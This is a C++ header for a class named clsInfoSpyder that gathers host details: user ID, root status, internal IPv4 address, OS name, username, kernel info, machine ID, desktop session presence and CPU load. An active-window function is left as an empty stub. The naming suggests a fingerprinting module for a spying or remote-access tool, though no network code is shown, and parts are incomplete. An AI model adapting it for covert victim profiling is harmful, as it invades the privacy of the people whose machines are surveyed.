#pragma once

#include <iostream>
#include <string>
#include <sys/utsname.h>
#include <unistd.h>
#include <vector>
#include <fstream>
#include <pwd.h>
#include <sstream>
#include <vector>
#include <unordered_map>
#include <ifaddrs.h>

#include "clsTools.hpp"

class clsInfoSpyder
{
public:
    struct stInfo
    {
        uid_t m_nUid;
        std::string m_szIPv4;
        std::string m_szOSName;
        std::string m_szUsername;
        std::string m_szUname;
        std::string m_szMachineID;

        bool m_bIsRoot;
        bool m_bHasDesktop;

        std::string m_szActiveWindow;

        stInfo() = default;

        stInfo(
            uid_t uid,
            const std::string &szIPv4,
            const std::string &szOSName,
            const std::string &szUsername,
            const std::string &szUname,
            const std::string &szMachineID,
            bool bIsRoot,
            bool bHasDesktop
        )
            : m_nUid(uid),
              m_szIPv4(szIPv4),
              m_szOSName(szOSName),
              m_szUsername(szUsername),
              m_szUname(szUname),
              m_szMachineID(szMachineID),
              m_bIsRoot(bIsRoot),
              m_bHasDesktop(bHasDesktop)
        {}
    };

    struct stCpuTimes
    {
        long long user, nice, system, idle, iowait, irq, softirq, steal;
    };

    stInfo m_info;  // fine

    clsInfoSpyder()
    {
        uid_t uid = getuid();
        std::string szIPv4 = fnszGetInternalIPv4();
        std::string szOsName = fnszGetOSName();
        std::string szUsername = fnszUsernameFromUid(uid);
        std::string szUname = fnszUnameInfo();
        std::string szMachineID = fnszReadMachineId();
        bool bIsRoot = uid == 0;
        bool bHasDesktop = fnbHasDesktopSession();
        
        stInfo info;
        info.m_nUid = uid;
        info.m_szIPv4 = szIPv4;
        info.m_szUsername = szUsername;
        info.m_szUname = szUname;
        info.m_szMachineID = szMachineID;
        info.m_bIsRoot = bIsRoot;
        info.m_szOSName = szOsName;
        info.m_bHasDesktop = bHasDesktop;

        m_info = info;
    }

    std::string fnszReadFileTrim(const std::string &szFilePath)
    {
        std::ifstream fs(szFilePath);
        if (!fs)
            return "";

        std::string s;
        std::getline(fs, s);

        size_t start = s.find_first_not_of(" \t\r\n");
        size_t end = s.find_last_not_of(" \t\r\n");

        if (start == std::string::npos)
            return "";

        return s.substr(start, end - start + 1);
    }

    std::string fnszGetOSName()
    {
        auto osmap = fnParseOSName();
        std::string szPrettyName;
        if (osmap.count("PRETTY_NAME"))
        {
            szPrettyName = osmap["PRETTY_NAME"];
        }
        else if (osmap.count("NAME"))
        {
            szPrettyName = osmap["NAME"];
            if (osmap.count("VERSION"))
                szPrettyName += " " + osmap["VERSION"];
        }
        else
        {
            szPrettyName = fnszUnameInfo();
        }

        return szPrettyName;
    }

    std::unordered_map<std::string, std::string> fnParseOSName(const std::string &szFilePath = "/etc/os-release")
    {
        std::unordered_map<std::string, std::string> m;
        std::ifstream fs(szFilePath);

        if (!fs)
            return m;
        
        std::string szLine;
        while (std::getline(fs, szLine))
        {
            if (szLine.empty() || szLine[0] == '#')
                continue;
            
            auto eq = szLine.find('=');
            if (eq == std::string::npos)
                continue;
            
            std::string szKey = szLine.substr(0, eq);
            std::string szValue = szLine.substr(eq + 1);

            if (!szValue.empty() && szValue.front() == '"' && szValue.back() == '"')
                szValue = szValue.substr(1, szValue.size() - 2);
            
            size_t start = szKey.find_first_not_of(" \t");
            size_t end = szKey.find_last_not_of(" \t");

            if (start == std::string::npos)
                continue;

            szKey = szKey.substr(start, end - start + 1);
            m[szKey] = szValue;
        }

        return m;
    }

    std::string fnszUnameInfo()
    {
        struct utsname u;
        if (uname(&u) == 0)
        {
            std::ostringstream oss;
            oss << u.sysname << " " << u.release << " " << u.machine;
            
            return oss.str();
        }

        return "";
    }

    std::string fnszUsernameFromUid(uid_t uid)
    {
        struct passwd pwd_buf;
        struct passwd *pwd = nullptr;

        long bufsize = sysconf(_SC_GETPW_R_SIZE_MAX);
        if (bufsize == -1) bufsize = 16384; // fallback

        std::vector<char> buf(static_cast<size_t>(bufsize));
        int r = getpwuid_r(uid, &pwd_buf, buf.data(), buf.size(), &pwd);
        if (r == 0 && pwd)
            return std::string(pwd->pw_name);

        const char *env = getenv("USER");
        if (env)
            return std::string(env);

        return "";
    }

    std::string fnszReadMachineId()
    {
        const char *caPath[] = {
            "/etc/machine-id",
            "/var/lib/dbus/machine-id",
        };

        for (auto path : caPath)
        {
            std::string s = fnszReadFileTrim(path);
            if (!s.empty())
                return s;
        }

        return "";
    }

    bool fnbHasDesktopSession()
    {
        const char* caDesktopVars[] = {
            "DISPLAY",
            "WAYLAND_DISPLAY",
            "XDG_SESSION_TYPE",
            "XDG_CURRENT_DESKTOP",
            "DESKTOP_SESSION",
            "GNOME_DESKTOP_SESSION_ID",
            "DBUS_SESSION_BUS_ADDRESS",
        };

        for (const char *v : caDesktopVars)
        {
            const char *val = getenv(v);
            if (val && val[0] != '\0')
                return true;
        }

        const char *xdg = getenv("XDG_RUNTIME_DIR");
        if (xdg && xdg[0] != '\0')
            return true;

        return false;
    }

    std::string fnszGetInternalIPv4()
    {
        struct ifaddrs *ifAddrStruct = nullptr;
        struct ifaddrs *ifa = nullptr;
        void *tmpAddrPtr = nullptr;

        if (getifaddrs(&ifAddrStruct) == -1)
        {
            //todo: output error message.
            return "[UNKNOWN]";
        }

        std::string szIPAddr = "";
        for (ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next)
        {
            if (ifa->ifa_addr->sa_family == AF_INET)
            {
                tmpAddrPtr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
                char addressBuffer[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, tmpAddrPtr, addressBuffer, INET_ADDRSTRLEN);
                
                // Skip loopback address
                if (std::string(ifa->ifa_name) != "lo") {
                    szIPAddr = addressBuffer;
                    break;
                }
            }
        }

        if (ifAddrStruct != nullptr)
            freeifaddrs(ifAddrStruct);
        
        return szIPAddr;
    }

    double fnGetCpuUsage()
    {
        stCpuTimes t1 = fnGetCpuTimes();
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        stCpuTimes t2 = fnGetCpuTimes();

        long long idle1 = t1.idle + t1.iowait;
        long long idle2 = t2.idle + t2.iowait;

        long long total1 = t1.user + t1.nice + t1.system + idle1 +
                        t1.irq + t1.softirq + t1.steal;
        long long total2 = t2.user + t2.nice + t2.system + idle2 +
                        t2.irq + t2.softirq + t2.steal;

        long long totalDiff = total2 - total1;
        long long idleDiff  = idle2 - idle1;

        return 100.0 * (totalDiff - idleDiff) / totalDiff;
    }

    stCpuTimes fnGetCpuTimes()
    {
        std::ifstream file("/proc/stat");
        stCpuTimes times {};
        std::string szCpu;

        file >> szCpu
             >> times.user
             >> times.nice
             >> times.system
             >> times.idle
             >> times.iowait
             >> times.irq
             >> times.softirq
             >> times.steal;

        return times;
    }

    std::string fnGetActiveWindow()
    {
        
    }
};
